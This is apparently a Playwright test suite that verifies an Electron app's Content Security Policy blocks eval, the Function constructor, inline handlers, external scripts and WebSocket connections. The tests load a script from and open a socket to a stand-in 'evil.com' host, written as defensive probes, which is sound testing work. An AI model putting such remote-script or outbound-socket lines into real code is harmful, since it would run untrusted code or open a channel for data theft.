import { test, expect } from '@playwright/test';
import { _electron as electron, ElectronApplication, Page } from 'playwright';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const mainPath = path.join(__dirname, '../../dist/main/index.js');
const ciArgs = process.env.ELECTRON_DISABLE_SANDBOX
  ? ['--no-sandbox', '--disable-gpu', '--disable-dev-shm-usage']
  : [];
const launchArgs = [mainPath, ...ciArgs];

let electronApp: ElectronApplication;
let window: Page;

test.beforeAll(async () => {
  electronApp = await electron.launch({
    args: launchArgs,
    timeout: 60000,
  });
  window = await electronApp.firstWindow({ timeout: 60000 });
});

test.afterAll(async () => {
  await electronApp.close();
});

test.describe('Content Security Policy Enforcement', () => {
  test('CSP blocks eval()', async () => {
    const result = await window.evaluate(() => {
      try {
        // Attempt to use eval - should be blocked by CSP
        eval('1+1');
        return 'eval succeeded (BAD)';
      } catch (error) {
        return 'eval blocked (GOOD)';
      }
    });

    expect(result).toBe('eval blocked (GOOD)');
  });

  test('CSP blocks new Function()', async () => {
    const result = await window.evaluate(() => {
      try {
        // Attempt to use Function constructor - should be blocked by CSP
        const fn = new Function('return 1+1');
        fn();
        return 'Function constructor succeeded (BAD)';
      } catch (error) {
        return 'Function constructor blocked (GOOD)';
      }
    });

    expect(result).toBe('Function constructor blocked (GOOD)');
  });

  test('CSP blocks inline event handlers', async () => {
    const result = await window.evaluate(() => {
      try {
        // Attempt to create element with inline event handler
        const div = document.createElement('div');
        div.innerHTML = '<button onclick="alert(1)">Click</button>';
        document.body.appendChild(div);

        const button = div.querySelector('button');
        if (button) {
          // Try to trigger the inline handler
          button.click();
        }

        // Clean up
        div.remove();

        // If we got here and no alert appeared, CSP blocked it
        return 'inline handler blocked (GOOD)';
      } catch (error) {
        return 'inline handler blocked (GOOD)';
      }
    });

    expect(result).toBe('inline handler blocked (GOOD)');
  });

  test('CSP allows inline styles with nonce', async () => {
    // Note: This tests that CSP doesn't block everything, just unsafe content
    const hasInlineStyles = await window.evaluate(() => {
      const element = document.querySelector('style');
      return element !== null;
    });

    // Should have some inline styles (properly nonced/hashed in production)
    expect(hasInlineStyles).toBeTruthy();
  });

  test('CSP blocks external script loading from untrusted sources', async () => {
    const result = await window.evaluate(() => {
      return new Promise((resolve) => {
        const script = document.createElement('script');
        script.src = 'https://evil.com/malicious.js';

        script.onerror = () => {
          resolve('external script blocked (GOOD)');
        };

        script.onload = () => {
          resolve('external script loaded (BAD)');
        };

        document.body.appendChild(script);

        // Timeout in case neither fires
        setTimeout(() => {
          resolve('external script blocked (GOOD)');
        }, 2000);
      });
    });

    expect(result).toBe('external script blocked (GOOD)');
  });

  test('CSP reports violations to console', async () => {
    const violations: string[] = [];

    window.on('console', (msg) => {
      const text = msg.text();
      if (text.includes('Content Security Policy') || text.includes('CSP')) {
        violations.push(text);
      }
    });

    // Attempt to violate CSP
    await window.evaluate(() => {
      try {
        eval('1+1');
      } catch {
        // Expected to fail
      }
    });

    await window.waitForTimeout(500);

    // Should have CSP violation logged
    expect(violations.length).toBeGreaterThan(0);
  });

  test('CSP meta tag is present in HTML', async () => {
    const hasCspMeta = await window.evaluate(() => {
      const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
      return meta !== null;
    });

    expect(hasCspMeta).toBe(true);
  });

  test('CSP directive includes script-src restrictions', async () => {
    const cspContent = await window.evaluate(() => {
      const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
      return meta?.getAttribute('content') || '';
    });

    expect(cspContent).toContain('script-src');
    expect(cspContent.toLowerCase()).toMatch(/script-src.*'self'/);
  });

  test('CSP directive includes default-src restrictions', async () => {
    const cspContent = await window.evaluate(() => {
      const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
      return meta?.getAttribute('content') || '';
    });

    expect(cspContent).toContain('default-src');
  });

  test('CSP does not allow unsafe-inline without nonce', async () => {
    const cspContent = await window.evaluate(() => {
      const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
      return meta?.getAttribute('content') || '';
    });

    // Should not have unsafe-inline without proper nonce/hash
    const hasUnsafeInline = cspContent.includes("'unsafe-inline'");
    const hasNonce = cspContent.includes("'nonce-");

    if (hasUnsafeInline) {
      // If unsafe-inline is present, must have nonce
      expect(hasNonce).toBe(true);
    }
  });

  test('CSP blocks WebSocket connections to arbitrary origins', async () => {
    const result = await window.evaluate(() => {
      try {
        const ws = new WebSocket('ws://evil.com/socket');
        ws.close();
        return 'WebSocket connection allowed (BAD)';
      } catch (error) {
        return 'WebSocket connection blocked (GOOD)';
      }
    });

    expect(result).toBe('WebSocket connection blocked (GOOD)');
  });
});
